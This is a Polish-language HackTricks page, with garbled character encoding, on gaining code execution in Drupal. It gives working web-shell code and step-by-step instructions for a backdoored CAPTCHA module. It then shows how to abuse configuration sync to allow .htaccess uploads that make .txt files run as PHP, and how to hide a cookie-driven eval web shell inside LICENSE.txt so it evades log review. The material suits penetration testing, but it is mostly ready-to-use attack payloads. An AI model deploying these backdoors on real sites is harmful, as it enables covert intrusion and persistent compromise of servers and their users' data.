# Drupal RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Z moduÅ‚em PHP Filter

{% hint style="warning" %}
W starszych wersjach Drupala **(przed wersjÄ… 8)**, moÅ¼liwe byÅ‚o zalogowanie siÄ™ jako administrator i **wÅ‚Ä…czenie moduÅ‚u `PHP filter`**, ktÃ³ry "Pozwala na ocenÄ™ osadzonego kodu/snippetÃ³w PHP." Jednak od wersji 8 ten moduÅ‚ nie jest instalowany domyÅ›lnie.
{% endhint %}

Musisz mieÄ‡ **zainstalowany plugin php** (sprawdÅº, wchodzÄ…c do _/modules/php_ i jeÅ›li zwraca **403**, to **istnieje**, jeÅ›li **nie znaleziono**, to **plugin php nie jest zainstalowany**)

PrzejdÅº do _Modules_ -> (**SprawdÅº**) _PHP Filter_ -> _Zapisz konfiguracjÄ™_

![](<../../../.gitbook/assets/image (247) (1).png>)

NastÄ™pnie kliknij na _Dodaj treÅ›Ä‡_ -> Wybierz _Podstawowa strona_ lub _ArtykuÅ‚_ -> Napisz _php shellcode w treÅ›ci_ -> Wybierz _Kod PHP_ w _Formacie tekstu_ -> Wybierz _PodglÄ…d_

![](<../../../.gitbook/assets/image (338).png>)

Na koniec po prostu uzyskaj dostÄ™p do nowo utworzonego wÄ™zÅ‚a:
```bash
curl http://drupal-site.local/node/3
```
## Zainstaluj moduÅ‚ PHP Filter

{% hint style="warning" %}
W aktualnych wersjach nie jest juÅ¼ moÅ¼liwe instalowanie wtyczek tylko przy dostÄ™pie do sieci po domyÅ›lnej instalacji.
{% endhint %}

Od wersji **8 wzwyÅ¼, moduÅ‚** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **nie jest instalowany domyÅ›lnie**. Aby skorzystaÄ‡ z tej funkcjonalnoÅ›ci, musimy **zainstalowaÄ‡ moduÅ‚ samodzielnie**.

1. Pobierz najnowszÄ… wersjÄ™ moduÅ‚u ze strony Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Po pobraniu przejdÅº do **`Administracja`** > **`Raporty`** > **`DostÄ™pne aktualizacje`**.
3. Kliknij na **`PrzeglÄ…daj`**, wybierz plik z katalogu, do ktÃ³rego go pobrano, a nastÄ™pnie kliknij **`Zainstaluj`**.
4. Po zainstalowaniu moduÅ‚u moÅ¼emy kliknÄ…Ä‡ na **`TreÅ›Ä‡`** i **utworzyÄ‡ nowÄ… stronÄ™ podstawowÄ…**, podobnie jak zrobiliÅ›my to w przykÅ‚adzie Drupal 7. Ponownie upewnij siÄ™, Å¼e **wybraÅ‚eÅ› `Kod PHP` z rozwijanego menu `Format tekstu`**.

## ModuÅ‚ z tylnym dostÄ™pem

{% hint style="warning" %}
W aktualnych wersjach nie jest juÅ¼ moÅ¼liwe instalowanie wtyczek tylko przy dostÄ™pie do sieci po domyÅ›lnej instalacji.
{% endhint %}

ModuÅ‚ z tylnym dostÄ™pem moÅ¼na stworzyÄ‡ przez **dodanie powÅ‚oki do istniejÄ…cego moduÅ‚u**. ModuÅ‚y moÅ¼na znaleÅºÄ‡ na stronie drupal.org. Wybierzmy moduÅ‚ taki jak [CAPTCHA](https://www.drupal.org/project/captcha). PrzewiÅ„ w dÃ³Å‚ i skopiuj link do archiwum tar.gz [archiwum](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Pobierz archiwum i wypakuj jego zawartoÅ›Ä‡.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* StwÃ³rz **PHP web shell** z zawartoÅ›ciÄ…:
```php
<?php
system($_GET["cmd"]);
?>
```
* NastÄ™pnie musimy utworzyÄ‡ plik **`.htaccess`**, aby uzyskaÄ‡ dostÄ™p do folderu. Jest to konieczne, poniewaÅ¼ Drupal odmawia bezpoÅ›redniego dostÄ™pu do folderu **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* PowyÅ¼sza konfiguracja zastosuje zasady dla folderu /, gdy zaÅ¼Ä…damy pliku w /modules. Skopiuj oba te pliki do folderu captcha i utwÃ³rz archiwum.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* ZakÅ‚adajÄ…c, Å¼e mamy **dostÄ™p administracyjny** do strony, kliknij na **`ZarzÄ…dzaj`** a nastÄ™pnie **`Rozszerz`** w pasku bocznym. NastÄ™pnie kliknij przycisk **`+ Zainstaluj nowy moduÅ‚`**, a zostaniemy przeniesieni na stronÄ™ instalacji, takÄ… jak `http://drupal-site.local/admin/modules/install`. PrzeglÄ…daj archiwum z backdoored Captcha i kliknij **`Zainstaluj`**.
* Po pomyÅ›lnej instalacji, przejdÅº do **`/modules/captcha/shell.php`**, aby wykonaÄ‡ polecenia.

## Backdooring Drupal z synchronizacjÄ… konfiguracji <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post udostÄ™pniony przez** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### CzÄ™Å›Ä‡ 1 (aktywacja _Media_ i _Biblioteka mediÃ³w_)

W menu _Rozszerz_ (/admin/modules) moÅ¼esz aktywowaÄ‡ to, co wydaje siÄ™ byÄ‡ juÅ¼ zainstalowanymi wtyczkami. DomyÅ›lnie wtyczki _Media_ i _Biblioteka mediÃ³w_ nie wydajÄ… siÄ™ byÄ‡ aktywowane, wiÄ™c aktywujmy je.

Przed aktywacjÄ…:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Po aktywacji:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### CzÄ™Å›Ä‡ 2 (wykorzystanie funkcji _Synchronizacja konfiguracji_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Wykorzystamy funkcjÄ™ _Synchronizacja konfiguracji_, aby zrzuciÄ‡ (eksportowaÄ‡) i przesÅ‚aÄ‡ (importowaÄ‡) wpisy konfiguracji Drupal:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Zacznijmy od patchowania pierwszego wpisu `allow_insecure_uploads` z:

Plik: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Do:

Plik: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field\_media\_document.yml**

NastÄ™pnie, zaÅ‚atw drugi wpis `file_extensions` z: 

Plik: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Do:

Plik: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Nie uÅ¼ywam tego w tym wpisie na blogu, ale zauwaÅ¼ono, Å¼e moÅ¼liwe jest zdefiniowanie wpisu `file_directory` w dowolny sposÃ³b i Å¼e jest on podatny na atak typu path traversal (wiÄ™c moÅ¼emy cofnÄ…Ä‡ siÄ™ w gÃ³rÄ™ w drzewie systemu plikÃ³w Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### CzÄ™Å›Ä‡ 3 (wykorzystanie funkcji _Dodaj dokument_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Ostatni krok jest najprostszy i dzieli siÄ™ na dwa podkroki. Pierwszy to przesÅ‚anie pliku w formacie .htaccess, aby wykorzystaÄ‡ dyrektywy Apache i umoÅ¼liwiÄ‡ interpretacjÄ™ plikÃ³w .txt przez silnik PHP. Drugi to przesÅ‚anie pliku .txt zawierajÄ…cego nasz Å‚adunek.

Plik: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Dlaczego ten trik jest fajny?

PoniewaÅ¼ po umieszczeniu Webshella (ktÃ³ry nazwiemy LICENSE.txt) na serwerze WWW, moÅ¼emy przesyÅ‚aÄ‡ nasze polecenia za pomocÄ… `$_COOKIE`, a w logach serwera WWW pojawi siÄ™ to jako legalne Å¼Ä…danie GET do pliku tekstowego.

Dlaczego nazywamy nasz Webshell LICENSE.txt?

Po prostu dlatego, Å¼e jeÅ›li weÅºmiemy nastÄ™pujÄ…cy plik, na przykÅ‚ad [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (ktÃ³ry juÅ¼ znajduje siÄ™ w rdzeniu Drupal), mamy plik o dÅ‚ugoÅ›ci 339 linii i rozmiarze 17,6 KB, co jest idealne do dodania maÅ‚ego fragmentu kodu PHP w Å›rodku (poniewaÅ¼ plik jest wystarczajÄ…co duÅ¼y).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Plik: Zaktualizowany LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **CzÄ™Å›Ä‡ 3.1 (przeÅ›lij plik .htaccess)**

Najpierw wykorzystujemy funkcjÄ™ _Dodaj dokument_ (/media/add/document), aby przesÅ‚aÄ‡ nasz plik zawierajÄ…cy dyrektywy Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**CzÄ™Å›Ä‡ 3.2 (przeÅ›lij plik LICENSE.txt)**

NastÄ™pnie ponownie wykorzystujemy funkcjÄ™ _Dodaj dokument_ (/media/add/document), aby przesÅ‚aÄ‡ Webshell ukryty w pliku licencyjnym.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### CzÄ™Å›Ä‡ 4 (interakcja z Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Ostatnia czÄ™Å›Ä‡ polega na interakcji z Webshell.

Jak pokazano na poniÅ¼szym zrzucie ekranu, jeÅ›li ciasteczko oczekiwane przez nasz Webshell nie jest zdefiniowane, otrzymujemy nastÄ™pujÄ…cy wynik podczas konsultacji pliku za pomocÄ… przeglÄ…darki internetowej.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Gdy atakujÄ…cy ustawi ciasteczko, moÅ¼e interagowaÄ‡ z Webshell i wykonywaÄ‡ dowolne polecenia, ktÃ³re chce.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Jak widaÄ‡ w logach, wyglÄ…da na to, Å¼e Å¼Ä…dany byÅ‚ tylko plik txt.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

DziÄ™kujemy za poÅ›wiÄ™cenie czasu na przeczytanie tego artykuÅ‚u, mam nadziejÄ™, Å¼e pomoÅ¼e Ci zdobyÄ‡ kilka shelli.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
